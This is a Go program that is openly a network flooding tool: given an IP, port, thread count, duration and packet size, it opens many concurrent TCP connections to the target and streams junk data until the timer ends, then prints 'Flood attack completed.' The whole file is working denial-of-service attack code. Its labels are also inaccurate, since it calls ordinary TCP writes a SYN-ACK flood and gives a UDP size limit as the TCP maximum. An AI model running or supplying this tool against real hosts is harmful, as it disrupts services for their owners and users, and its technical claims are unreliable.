package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
	"runtime"
	"math/rand"
)

func sendTcpSynAckFlood(wg *sync.WaitGroup, done <-chan struct{}, ip string, port int, packetSize int) {
	defer wg.Done()

	
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Printf("Failed to create connection to %s:%d: %v\n", ip, port, err)
		return
	}
	defer conn.Close()

	
	packet := make([]byte, packetSize)
	for {
		select {
		case <-done:
			return
		default:
			
			_, err := conn.Write(packet)
			if err != nil {
				fmt.Printf("Failed to send SYN-ACK packet to %s:%d: %v\n", ip, port, err)
				return
			}
			
			time.Sleep(time.Millisecond * time.Duration(rand.Intn(10)))
		}
	}
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s <ip> <port> <num_threads> <duration_seconds> <packet_size>\n", os.Args[0])
		os.Exit(1)
	}

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil || port <= 0 || port > 65535 {
		fmt.Printf("Invalid port number: %s\n", os.Args[2])
		os.Exit(1)
	}

	threads, err := strconv.Atoi(os.Args[3])
	if err != nil || threads <= 0 {
		fmt.Printf("Invalid number of threads: %s\n", os.Args[3])
		os.Exit(1)
	}

	duration, err := strconv.Atoi(os.Args[4])
	if err != nil || duration <= 0 {
		fmt.Printf("Invalid duration: %s\n", os.Args[4])
		os.Exit(1)
	}

	packetSize, err := strconv.Atoi(os.Args[5])
	if err != nil || packetSize <= 0 {
		fmt.Println("Invalid packet size:", os.Args[5])
		os.Exit(1)
	}

	
	if packetSize > 65507 { // Maximum TCP payload size
		fmt.Println("Packet size too large. Consider using a smaller size.")
		os.Exit(1)
	}

	var wg sync.WaitGroup
	done := make(chan struct{})

	
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go sendTcpSynAckFlood(&wg, done, ip, port, packetSize)
	}

	
	go func() {
		time.Sleep(time.Duration(duration) * time.Second)
		close(done)
	}()

	
	wg.Wait()

	
	fmt.Println("Flood attack completed.")
}
